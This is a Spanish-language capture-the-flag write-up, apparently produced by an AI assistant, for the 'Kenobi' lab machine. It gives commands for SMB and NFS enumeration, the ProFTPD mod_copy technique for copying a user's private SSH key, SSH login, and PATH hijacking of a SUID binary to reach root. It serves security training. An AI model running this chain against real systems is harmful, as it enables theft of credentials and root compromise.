Perfecto, ahora sí: **comandos + explicación breve (pero con sentido)** en cada paso, estilo writeup técnico bueno 👇

---

# Write-up Kenobi (comandos + justificación)

📄 Basado en: 

---

# 1. Reconocimiento

```bash
nmap -sC -sV -O -p 1-10000 -T4 IP
nmap -T4 --script vuln IP
```

Este escaneo se hace para identificar servicios, versiones y posibles vulnerabilidades desde el inicio. No solo interesa qué puertos están abiertos, sino detectar servicios típicamente explotables como SMB, FTP o NFS, que suelen permitir accesos indirectos o mal configurados. Aquí destacan especialmente SMB (enumeración), FTP (posibles exploits) y NFS (acceso a filesystem).

---

# 2. Enumeración SMB

```bash
smbclient -L //IP -N
```

Se intenta acceso anónimo porque SMB frecuentemente permite listar recursos sin autenticación. Esto permite descubrir shares accesibles que pueden contener información interna útil.

---

```bash
smbclient //IP/anonymous
ls
get log.txt
```

Se accede al share `anonymous` para buscar información sensible. El archivo `log.txt` revela el usuario `kenobi` y detalles del sistema, lo cual es clave porque proporciona un usuario válido para posteriores accesos (por ejemplo SSH) y posibles rutas internas.

---

# 3. Enumeración NFS

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP
```

Se enumera NFS porque permite montar directorios remotos. Detectar que `/var` está exportado es importante, ya que esto permite acceder indirectamente al sistema de archivos de la máquina víctima, lo que puede utilizarse para leer o recuperar archivos sensibles.

---

# 4. Explotación ProFTPD (mod_copy)

```bash
searchsploit proftpd 1.3.5
```

Se busca un exploit basado en la versión detectada previamente. Se identifica que el módulo `mod_copy` permite copiar archivos sin autenticación, lo cual es ideal para acceder a archivos sensibles sin necesidad de credenciales.

---

```bash
nc IP 21
```

Se usa `netcat` para interactuar manualmente con el servicio FTP y poder enviar comandos especiales como `SITE`, que no siempre están disponibles en clientes FTP normales.

---

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Aquí se copia la clave privada SSH del usuario `kenobi` a `/var/tmp`. Esto se hace porque no se puede leer directamente el archivo, pero sí copiarlo a una ubicación que luego será accesible mediante NFS, combinando así dos servicios para obtener la información.

---

# 5. Montaje NFS y obtención de la key

```bash
sudo mkdir /mnt/kenobi
sudo mount IP:/var /mnt/kenobi
```

Se monta el recurso NFS para acceder al contenido de `/var` como si fuera local. Esto permite recuperar el archivo previamente copiado desde FTP.

---

```bash
ls /mnt/kenobi/tmp
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
```

Se copia la clave privada y se ajustan permisos porque SSH requiere que la clave no sea accesible por otros usuarios. Este paso convierte el acceso indirecto en credenciales reales utilizables.

---

# 6. Acceso inicial por SSH

```bash
ssh -i id_rsa kenobi@IP
```

Se utiliza la clave obtenida junto con el usuario descubierto previamente. Esto permite acceso directo al sistema sin necesidad de ataques de fuerza bruta, aprovechando credenciales legítimas.

---

# 7. Escalada de privilegios (SUID)

```bash
find / -perm -u=s -type f 2>/dev/null
```

Se buscan binarios SUID porque se ejecutan con privilegios elevados. Este tipo de binarios son un vector clásico de escalada si están mal implementados.

---

```bash
strings /usr/bin/menu
```

Se analiza el binario sospechoso para entender qué comandos ejecuta internamente. Detectar comandos como `curl` sin rutas absolutas indica que puede ser vulnerable a manipulación del PATH.

---

# 8. PATH Hijacking

```bash
cd /tmp
echo "/bin/sh" > curl
chmod +x curl
```

Se crea un falso binario `curl` en un directorio escribible. La idea es sustituir el comando legítimo por uno controlado que ejecute una shell.

---

```bash
export PATH=/tmp:$PATH
```

Se modifica el PATH para que el sistema busque primero en `/tmp`. Esto asegura que el binario falso será ejecutado en lugar del real.

---

```bash
/usr/bin/menu
```

Se ejecuta el binario vulnerable. Cuando intenta llamar a `curl`, ejecuta el falso creado, lo que resulta en una shell con privilegios elevados debido al bit SUID.

---

```bash
whoami
```

Confirma que se ha obtenido acceso como `root`.

---

# Conclusión

La máquina se compromete encadenando varios fallos: primero se obtiene información mediante SMB, luego se aprovecha NFS para acceder al sistema de archivos, y se utiliza una vulnerabilidad en FTP para copiar una clave privada. Finalmente, se logra acceso por SSH y se escala privilegios explotando un binario SUID vulnerable a PATH hijacking. No hay un único exploit crítico, sino una combinación de configuraciones débiles bien aprovechadas.

---

Si quieres subir nivel de verdad, el siguiente paso sería que te añada:

* MITRE ATT&CK por cada fase (muy top para portfolio)
* o cómo detectar esto en un SOC (te sirve para entrevistas)
